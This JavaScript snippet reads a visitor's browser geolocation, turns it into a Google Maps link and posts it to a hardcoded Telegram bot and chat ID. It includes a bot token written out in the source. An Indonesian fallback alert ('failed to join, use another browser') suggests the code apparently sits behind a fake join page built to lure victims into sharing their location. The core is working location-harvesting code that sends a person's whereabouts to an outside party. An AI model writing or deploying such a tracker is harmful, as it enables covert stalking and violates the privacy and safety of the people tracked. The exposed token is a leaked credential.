async function sendMessage(chatId, text) {
    const url =
        "https://api.telegram.org/bot6272982378:AAGlbqXRmJ0Ph5s6uvgQk4m0MvKfFgUYgE0/sendMessage";
    const payload = {
        chat_id: chatId,
        text: text,
    };

    const response = await fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
    });

    if (!response.ok) {
        throw new Error("Failed to send message");
    }
}

const getLocation = () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                let lat = position.coords.latitude;
                let lng = position.coords.longitude;
                let link = "https://maps.google.com/?q=" + lat + "," + lng;
                const chatId = "1989910881"; // replace with your chat id
                sendMessage(chatId, link)
                    .then(() => console.log("Message sent successfully"))
                    .catch((error) => console.error(error));
            },
            (error) => {
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        alert("PERMISSION_DENIED");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        alert("Location information is unavailable.");
                        break;
                    case error.TIMEOUT:
                        alert("The request to get user location timed out.");
                        break;
                    case error.UNKNOWN_ERROR:
                        alert("An unknown error occurred.");
                        break;
                }
            }
        );
    } else {
        alert("Gagal Join Silahkan gunakan Browser yang lain");
    }
};
